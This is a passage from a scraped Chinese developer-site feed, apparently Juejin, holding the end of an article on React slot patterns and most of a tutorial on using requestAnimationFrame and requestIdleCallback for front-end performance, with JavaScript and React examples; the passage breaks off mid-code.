}), []); <span class="hljs-comment">// 无依赖项，仅渲染一次</span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductCard</span>&gt;</span>{productSlots}<span class="hljs-tag">&lt;/<span class="hljs-name">ProductCard</span>&gt;</span></span>
</code></pre>
<ul>
<li>避免不必要的 Context 嵌套：Context 会增加组件渲染开销，简单场景优先使用 props；</li>
<li>边界处理：为所有插槽设置默认值，避免空渲染导致的布局错乱；</li>
<li>减少插槽内容的重渲染：通过 <code>React.memo</code> 包装插槽组件，避免无关更新。</li>
</ul>
<h2 data-id="heading-23">八、总结</h2>
<p>React 虽无原生插槽语法，但通过 <code>children</code> prop、多 props、函数作为 children、组件组合 + Context 等原生能力，能实现比 Vue 更灵活的插槽效果。核心在于理解「插槽是组件间内容与数据的双向传递」—— 简单场景用 <code>children</code>，多区域用命名插槽，需传数据用作用域插槽，复杂场景用组件组合 + Context。</p>
<p>掌握 React 插槽的核心是「根据场景选择合适的实现方案」，并注重性能优化，避免过度封装。合理使用插槽能大幅提升组件的复用性与扩展性，是 React 组件化开发中的必备技巧。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用requestIdleCallback和requestAnimationFrame优化前端性能]]></title>    <link>https://juejin.cn/post/7581333926372687914</link>    <guid>https://juejin.cn/post/7581333926372687914</guid>    <pubDate>2025-12-09T01:48:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581333926372687914" data-draft-id="7581324707480535081" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用requestIdleCallback和requestAnimationFrame优化前端性能"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T01:48:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dorisrv"/> <meta itemprop="url" content="https://juejin.cn/user/1522178380270712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用requestIdleCallback和requestAnimationFrame优化前端性能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1522178380270712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dorisrv
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T01:48:06.000Z" title="Tue Dec 09 2025 01:48:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">使用requestIdleCallback和requestAnimationFrame优化前端性能</h2>
<h3 data-id="heading-1">🤔 为什么需要性能优化API？</h3>
<p>在前端开发中，我们经常需要处理各种任务：DOM渲染、数据计算、网络请求等。如果这些任务处理不当，就会导致页面卡顿、响应缓慢，影响用户体验。</p>
<p>想象一下：用户正在滚动页面，同时我们的代码正在执行一个复杂的计算任务。这可能会导致页面卡顿，因为JavaScript是单线程的，复杂计算会阻塞主线程。</p>
<p>浏览器提供了两个强大的API来帮助我们优化这种情况：</p>
<ul>
<li><code>requestAnimationFrame</code>：在下一次浏览器重绘之前执行任务</li>
<li><code>requestIdleCallback</code>：在浏览器空闲时间执行任务</li>
</ul>
<p>这两个API可以帮助我们更合理地安排任务执行时间，避免阻塞主线程，提升页面流畅度。</p>
<h3 data-id="heading-2">💡 基础概念</h3>
<h4 data-id="heading-3">1. requestAnimationFrame</h4>
<p><code>requestAnimationFrame</code>是浏览器提供的一个API，它允许我们在下一次浏览器重绘之前执行回调函数。浏览器通常以60fps（每秒60次）的频率进行重绘，所以<code>requestAnimationFrame</code>的回调大约每16.7ms执行一次。</p>
<p><strong>应用场景</strong>：</p>
<ul>
<li>动画效果（如平滑滚动、进度条动画）</li>
<li>需要与页面渲染同步的任务</li>
<li>避免不必要的重绘和回流</li>
</ul>
<h4 data-id="heading-4">2. requestIdleCallback</h4>
<p><code>requestIdleCallback</code>是浏览器提供的另一个API，它允许我们在浏览器空闲时间执行回调函数。浏览器空闲时间是指：</p>
<ul>
<li>没有更高优先级的任务需要执行</li>
<li>一帧的渲染工作已经完成，还有剩余时间</li>
</ul>
<p><strong>应用场景</strong>：</p>
<ul>
<li>低优先级任务（如日志记录、数据上报）</li>
<li>批量处理大量数据</li>
<li>预加载非关键资源</li>
<li>避免影响用户交互的任务</li>
</ul>
<h3 data-id="heading-5">🚀 基础实现</h3>
<h4 data-id="heading-6">1. requestAnimationFrame 示例：平滑滚动</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 平滑滚动到页面顶部</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">smoothScrollToTop</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> startPosition = <span class="hljs-variable language_">window</span>.<span class="hljs-property">pageYOffset</span>;
  <span class="hljs-keyword">const</span> targetPosition = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> distance = targetPosition - startPosition;
  <span class="hljs-keyword">const</span> duration = <span class="hljs-number">800</span>; <span class="hljs-comment">// 动画持续时间（毫秒）</span>
  <span class="hljs-keyword">let</span> startTime = <span class="hljs-literal">null</span>;

  <span class="hljs-comment">// 动画函数</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">animation</span>(<span class="hljs-params">currentTime</span>) {
    <span class="hljs-keyword">if</span> (startTime === <span class="hljs-literal">null</span>) startTime = currentTime;
    <span class="hljs-keyword">const</span> timeElapsed = currentTime - startTime;
    <span class="hljs-keyword">const</span> progress = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(timeElapsed / duration, <span class="hljs-number">1</span>);
    <span class="hljs-comment">// 使用缓动函数让动画更自然</span>
    <span class="hljs-keyword">const</span> easeInOutQuad = progress &lt; <span class="hljs-number">0.5</span> ? <span class="hljs-number">2</span> * progress * progress : -<span class="hljs-number">1</span> + (<span class="hljs-number">4</span> - <span class="hljs-number">2</span> * progress) * progress;
    
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(<span class="hljs-number">0</span>, startPosition + distance * easeInOutQuad);
    
    <span class="hljs-keyword">if</span> (timeElapsed &lt; duration) {
      <span class="hljs-title function_">requestAnimationFrame</span>(animation);
    }
  }

  <span class="hljs-title function_">requestAnimationFrame</span>(animation);
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'scrollToTopBtn'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, smoothScrollToTop);
</code></pre>
<h4 data-id="heading-7">2. requestIdleCallback 示例：批量处理数据</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 需要处理的大量数据</span>
<span class="hljs-keyword">const</span> largeData = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">10000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i + <span class="hljs-number">1</span>);
<span class="hljs-keyword">const</span> batchSize = <span class="hljs-number">100</span>; <span class="hljs-comment">// 每批处理的数据量</span>
<span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;

<span class="hljs-comment">// 处理单个数据项的函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processItem</span>(<span class="hljs-params">item</span>) {
  <span class="hljs-comment">// 模拟复杂处理逻辑</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`处理数据项: <span class="hljs-subst">${item}</span>`</span>);
  <span class="hljs-keyword">return</span> item * <span class="hljs-number">2</span>;
}

<span class="hljs-comment">// 使用requestIdleCallback批量处理数据</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processDataInBatches</span>(<span class="hljs-params">deadline</span>) {
  <span class="hljs-comment">// 只要浏览器有空闲时间且还有数据需要处理</span>
  <span class="hljs-keyword">while</span> (deadline.<span class="hljs-title function_">timeRemaining</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; index &lt; largeData.<span class="hljs-property">length</span>) {
    <span class="hljs-title function_">processItem</span>(largeData[index]);
    index++;
    
    <span class="hljs-comment">// 每处理batchSize个数据项，检查一次时间</span>
    <span class="hljs-keyword">if</span> (index % batchSize === <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`已处理 <span class="hljs-subst">${index}</span> 个数据项`</span>);
      <span class="hljs-keyword">break</span>;
    }
  }
  
  <span class="hljs-comment">// 如果还有数据需要处理，继续请求空闲时间</span>
  <span class="hljs-keyword">if</span> (index &lt; largeData.<span class="hljs-property">length</span>) {
    <span class="hljs-title function_">requestIdleCallback</span>(processDataInBatches);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'所有数据处理完成'</span>);
  }
}

<span class="hljs-comment">// 启动批量处理</span>
<span class="hljs-title function_">requestIdleCallback</span>(processDataInBatches);
</code></pre>
<h3 data-id="heading-8">🎯 进阶实现：组合使用两个API</h3>
<p>在实际项目中，我们常常需要组合使用这两个API来实现更复杂的性能优化。例如：</p>
<ol>
<li>使用<code>requestAnimationFrame</code>执行与渲染相关的高优先级任务</li>
<li>使用<code>requestIdleCallback</code>执行低优先级的后台任务</li>
</ol>
<h4 data-id="heading-9">示例：高性能列表渲染</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HighPerformanceList</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">container, items, itemRenderer</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span> = container;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span> = items;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">itemRenderer</span> = itemRenderer;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">renderedItems</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">batchSize</span> = <span class="hljs-number">20</span>; <span class="hljs-comment">// 每批渲染的项目数</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> = <span class="hljs-number">0</span>;
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
  }
  
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 首先渲染可见区域的项目（高优先级）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderVisibleItems</span>();
    
    <span class="hljs-comment">// 然后在空闲时间渲染剩余项目（低优先级）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderRemainingItems</span>();
  }
  
  <span class="hljs-title function_">renderVisibleItems</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> containerRect = <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> visibleItems = <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
      <span class="hljs-comment">// 简化的可见性检查</span>
      <span class="hljs-keyword">const</span> itemRect = item.<span class="hljs-property">rect</span> || { <span class="hljs-attr">top</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">bottom</span>: <span class="hljs-number">0</span> };
      <span class="hljs-keyword">return</span> itemRect.<span class="hljs-property">bottom</span> &gt;= containerRect.<span class="hljs-property">top</span> &amp;&amp; itemRect.<span class="hljs-property">top</span> &lt;= containerRect.<span class="hljs-property">bottom</span>;
    });
    
    <span class="hljs-comment">// 使用requestAnimationFrame渲染可见项目</span>
    <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> {
      visibleItems.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">renderedItems</span>.<span class="hljs-title function_">has</span>(item.<span class="hljs-property">id</span>)) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderItem</span>(item);
        }
      });
    });
  }
  
  <span class="hljs-title function_">renderRemainingItems</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 使用requestIdleCallback在空闲时间渲染剩余项目</span>
    <span class="hljs-title function_">requestIdleCallback</span>(<span class="hljs-function">(<span class="hljs-params">deadline</span>) =&gt;</span> {
      <span class="hljs-keyword">let</span> renderedCount = <span class="hljs-number">0</span>;
      
      <span class="hljs-keyword">while</span> (deadline.<span class="hljs-title function_">timeRemaining</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">const</span> item = <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span>];
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">renderedItems</span>.<span class="hljs-title function_">has</span>(item.<span class="hljs-property">id</span>)) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderItem</span>(item);
          renderedCount++;
          
          <span class="hljs-comment">// 每渲染batchSize个项目，检查一次时间</span>
          <span class="hljs-keyword">if</span> (renderedCount &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">batchSize</span>) {
            <span class="hljs-keyword">break</span>;
          }
        }
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span>++;
      }
      
      <span class="hljs-comment">// 如果还有项目需要渲染，继续请求空闲时间</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-property">length</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderRemainingItems</span>();
      }
    });
  }
  
  <span class="hljs-title function_">renderItem</span>(<span class="hljs-params">item</span>) {
    <span class="hljs-keyword">const</span> itemElement = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">itemRenderer</span>(item);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">appendChild</span>(itemElement);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">renderedItems</span>.<span class="hljs-title function_">add</span>(item.<span class="hljs-property">id</span>);
  }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'list-container'</span>);
<span class="hljs-keyword">const</span> items = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">1000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> ({
  <span class="hljs-attr">id</span>: i,
  <span class="hljs-attr">content</span>: <span class="hljs-string">`项目 <span class="hljs-subst">${i + <span class="hljs-number">1</span>}</span>`</span>,
  <span class="hljs-attr">rect</span>: { <span class="hljs-attr">top</span>: i * <span class="hljs-number">50</span>, <span class="hljs-attr">bottom</span>: (i + <span class="hljs-number">1</span>) * <span class="hljs-number">50</span> }
}));

<span class="hljs-keyword">function</span> <span class="hljs-title function_">itemRenderer</span>(<span class="hljs-params">item</span>) {
  <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  div.<span class="hljs-property">className</span> = <span class="hljs-string">'list-item'</span>;
  div.<span class="hljs-property">textContent</span> = item.<span class="hljs-property">content</span>;
  <span class="hljs-keyword">return</span> div;
}

<span class="hljs-keyword">new</span> <span class="hljs-title class_">HighPerformanceList</span>(container, items, itemRenderer);
</code></pre>
<h3 data-id="heading-10">🎨 React 中的应用</h3>
<h4 data-id="heading-11">1. 使用 requestAnimationFrame 实现动画效果</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useRef, useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">SmoothProgressBar</span> = (<span class="hljs-params">{ progress }</span>) =&gt; {
  <span class="hljs-keyword">const</span> [displayProgress, setDisplayProgress] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> ref = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);
  
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">let</span> animationId;
    <span class="hljs-keyword">const</span> startValue = displayProgress;
    <span class="hljs-keyword">const</span> targetValue = progress;
    <span class="hljs-keyword">const</span> startTime = performance.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">const</span> duration = <span class="hljs-number">500</span>; <span class="hljs-comment">// 动画持续时间（毫秒）</span>
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateProgress</span> = (<span class="hljs-params">currentTime</span>) =&gt; {
      <span class="hljs-keyword">const</span> elapsedTime = currentTime - startTime;
      <span class="hljs-keyword">const</span> progress = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(elapsedTime / duration, <span class="hljs-number">1</span>);
      
      <span class="hljs-comment">// 使用缓动函数</span>
      <span class="hljs-keyword">const</span> easeInOut = progress &lt; <span class="hljs-number">0.5</span> 
        ? <span class="hljs-number">4</span> * progress * progress * progress 
        : (progress - <span class="hljs-number">1</span>) * (<span class="hljs-number">2</span> * progress - <span class="hljs-number">2</span>) * (<span class="hljs-number">2</span> * progress - <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>;
      
      <span class="hljs-keyword">const</span> currentProgress = startValue + (targetValue - startValue) * easeInOut;
      <span class="hljs-title function_">setDisplayProgress</span>(currentProgress);
      
      <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">1</span>) {
        animationId = <span class="hljs-title function_">requestAnimationFrame</span>(updateProgress);
      }
    };
    
    animationId = <span class="hljs-title function_">requestAnimationFrame</span>(updateProgress);
    
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (animationId) {
        <span class="hljs-title function_">cancelAnimationFrame</span>(animationId);
      }
    };
  }, [progress]);
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"progress-bar-container"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
        <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span>
        <span class="hljs-attr">className</span>=<span class="hljs-string">"progress-bar-fill"</span> 
        <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> `${<span class="hljs-attr">displayProgress</span>}%` }}
      /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"progress-text"</span>&gt;</span>{Math.round(displayProgress)}%<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [progress, setProgress] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleButtonClick</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setProgress</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(prev + <span class="hljs-number">20</span>, <span class="hljs-number">100</span>));
  };
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"app"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>平滑进度条<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">SmoothProgressBar</span> <span class="hljs-attr">progress</span>=<span class="hljs-string">{progress}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleButtonClick}</span>&gt;</span>增加进度<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-12">2. 使用 requestIdleCallback 优化数据处理</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">LargeDataProcessor</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [processedCount, setProcessedCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> [status, setStatus] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">'idle'</span>);
  
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 模拟大量数据</span>
    <span class="hljs-keyword">const</span> largeData = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">5000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i + <span class="hljs-number">1</span>);
    <span class="hljs-keyword">let</span> processedIndex = <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">processBatch</span> = (<span class="hljs-params">deadline</span>) =&gt; {
      <span class="hljs-comment">// 只要浏览器有空闲时间且还有数据需要处理</span>
      <span class="hljs-keyword">while</span> (deadline.<span class="hljs-title function_">timeRemaining</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; processedIndex &lt; largeData.<span class="hljs-property">length</span>) {
        <span class="hljs-comment">// 模拟复杂的数据处理</span>
        <span class="hljs-keyword">const</span> data = largeData[processedIndex];
        <span class="hljs-keyword">const</span> result = data * <span class="hljs-number">2</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(data);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`处理数据 <span class="hljs-subst">${data}</span>，结果：<span class="hljs-subst">${result}</span>`</span>);
        
        processedIndex++;
        <span class="hljs-title function_">setProcessedCount</span>(processedIndex);
      }
      
      <span class="hljs-comment">// 如果还有数据需要处理，继续请求空闲时间</span>
      <span class="hljs-keyword">if</span> (processedIndex &lt; largeData.<span class="hljs-property">length</span>) {
        <span class="hljs-title function_">requestIdleCallback</span>(processBatch);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">setStatus</span>(<span class="hljs-string">'completed'</span>);
      }
    };
    
    <span class="hljs-comment">// 启动数据处理</span>
    <span class="hljs-title function_">setStatus</span>(<span class="hljs-string">'processing'</span>);
    <span class="hljs-title function_">requestIdleCallback</span>(processBatch);
    
  }, []);
  
